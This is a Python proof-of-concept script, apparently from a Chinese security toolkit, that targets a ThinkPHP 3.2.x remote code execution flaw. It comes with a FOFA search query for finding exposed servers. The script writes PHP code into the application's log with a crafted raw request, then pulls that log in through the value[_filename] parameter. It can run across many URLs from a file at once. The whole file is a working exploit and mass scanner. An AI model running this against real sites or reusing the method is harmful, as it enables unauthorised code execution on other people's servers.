#FOFA: body="thinkphp" | app="thinkphp" | icon_hash="1165838194"

import requests
import re
import argparse
import urllib3
import urllib
from urllib.parse import urlparse
from multiprocessing.dummy import Pool
import socket
from datetime import date, timedelta
import random
import string
import json
import time

urllib3.disable_warnings()

proxy = {'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080'}

def banner():
    info = """
   _____                __          __        _        _                 
  / ____|               \ \        / /       | |      | |                
 | |  __ _ __ __ _ ___ __\ \  /\  / /__  _ __| | _____| |__   ___  _ __  
 | | |_ | '__/ _` / __/ __\ \/  \/ / _ \| '__| |/ / __| '_ \ / _ \| '_ \ 
 | |__| | | | (_| \__ \__ \\  /\  / (_) | |  |   <\__ \ | | | (_) | |_) |
  \_____|_|  \__,_|___/___/ \/  \/ \___/|_|  |_|\_\___/_| |_|\___/| .__/ 
                                                                  | |    
                                                                  |_|    
"""
    print(info)

def poc(target):
    result = {
        'name': 'ThinkPHP3.2.x 远程代码执行',
        'vulnerable': False
    }
    payload1 = b'''
    GET /index.php?m=--><?=md5(1);?> HTTP/1.1
    Host: localhost:8080
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    Accept-Language: en-GB,en;q=0.5
    Accept-Encoding: gzip, deflate
    Connection: close
    Cookie: PHPSESSID=b6r46ojgc9tvdqpg9efrao7f66;
    Upgrade-Insecure-Requests: 1

        '''.replace(b'\n', b'\r\n')
    try:
        oH = urlparse(target)
        a = oH.netloc.split(':')
        port = 80
        if 2 == len(a):
            port = a[1]
        elif 'https' in oH.scheme:
            port = 443
        host = a[0]
        with socket.create_connection((host, port), timeout=5) as conn:
            conn.send(payload1)
            req1 = conn.recv(10240).decode()
            today = (date.today() + timedelta()).strftime("%y_%m_%d")
            payload2 = urllib.parse.urljoin(target,'index.php?m=Home&c=Index&a=index&value[_filename]=./Application/Runtime/Logs/Common/{0}.log'.format(today))
            req2 = requests.get(payload2, timeout=3)
            if re.search(r'c4ca4238a0b923820dcc509a6f75849b', req2.text):
                result['vulnerable'] = True
                result['method'] = 'GET'
                result['url'] = target
                result['payload'] = payload2
                print(result)
    except:
        print(f"{target}访问失败")


def main():
    parser = argparse.ArgumentParser("ThinkPHP 3.2.x版本 代码执行漏洞检测POC")
    parser.add_argument("-u", "--url", dest="url", help="Insert URL")
    parser.add_argument("-f", "--file", dest="file", help="Insert URLs file")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        with open(args.file, 'r') as uf:
            urls = []
            for u in uf.readlines():
                urls.append(u.strip())
            mp = Pool(10)
            mp.map(poc, urls)
            mp.close()
            mp.join()
    else:
        print("输入有误，请检查")

if __name__ == '__main__':
    banner()
    main()